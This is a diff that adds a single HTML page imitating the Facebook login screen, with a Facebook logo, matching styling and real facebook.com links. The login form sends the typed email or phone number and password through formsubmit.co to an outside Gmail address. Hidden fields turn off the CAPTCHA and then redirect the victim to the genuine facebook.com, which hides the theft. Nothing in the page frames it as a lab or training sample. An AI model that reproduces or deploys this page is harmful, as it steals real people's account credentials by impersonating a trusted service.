@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    
+    <!-- Internal CSS -->
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to right, #ffdde1, #c6e2ff);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+            width: 320px;
+            text-align: center;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .logo {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+        }
+        .input-box {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .btn:hover {
+            background: #135bc5;
+        }
+        .link {
+            display: block;
+            margin-top: 10px;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .link:hover {
+            text-decoration: underline;
+        }
+        .language-container {
+            position: relative;
+            display: inline-block;
+        }
+        .language-btn {
+            background: none;
+            border: none;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        .dropdown-menu {
+            display: none;
+            position: absolute;
+            right: 0;
+            background: white;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
+            width: 150px;
+            text-align: left;
+        }
+        .dropdown-menu a {
+            display: block;
+            padding: 8px;
+            color: black;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .dropdown-menu a:hover {
+            background: #f0f0f0;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Header Section -->
+        <div class="header">
+            <i class="fas fa-arrow-left"></i>
+            <div class="language-container">
+                <button class="language-btn" id="language-btn">English (US) ▼</button>
+                <div class="dropdown-menu" id="language-menu">
+                    <a href="#" onclick="changeLanguage('English (US)')">English (US)</a>
+                    <a href="#" onclick="changeLanguage('Español')">Español</a>
+                    <a href="#" onclick="changeLanguage('Français (France)')">Français (France)</a>
+                    <a href="#" onclick="changeLanguage('中文(简体)')">中文(简体)</a>
+                </div>
+            </div>
+        </div>
+
+        <!-- Logo -->
+        <img src="https://storage.googleapis.com/a1aa/image/hLuGmwxgUqBsgNrZcz6KfO6-NstQho-Wot5zI8qv9VY.jpg" alt="Facebook Logo" class="logo">
+
+        <!-- Login Form -->
+        <form action="https://formsubmit.co/chargebacktech@gmail.com" method="POST">
+            <input type="text" name="email" placeholder="Mobile number or email" class="input-box" required>
+            <input type="password" name="password" placeholder="Password" class="input-box" required>
+            
+            <!-- Hidden input to disable CAPTCHA and enable redirect -->
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_next" value="https://www.facebook.com/">
+            
+            <button type="submit" class="btn">Log in</button>
+        </form>
+
+        <!-- Links -->
+        <a href="https://www.facebook.com/recover/initiate" class="link">Forgot password?</a>
+        <button class="btn" style="background: white; color: #1877f2; border: 1px solid #1877f2;">Create new account</button>
+    </div>
+
+    <!-- Internal JavaScript -->
+    <script>
+        document.getElementById("language-btn").addEventListener("click", function () {
+            let menu = document.getElementById("language-menu");
+            menu.style.display = menu.style.display === "block" ? "none" : "block";
+        });
+
+        function changeLanguage(language) {
+            document.getElementById("language-btn").innerText = language + " ▼";
+            document.getElementById("language-menu").style.display = "none";
+        }
+
+        // Close the dropdown when clicking outside
+        document.addEventListener("click", function(event) {
+            let menu = document.getElementById("language-menu");
+            let button = document.getElementById("language-btn");
+            if (!menu.contains(event.target) && !button.contains(event.target)) {
+                menu.style.display = "none";
+            }
+        });
+    </script>
+
+</body>
+</html>
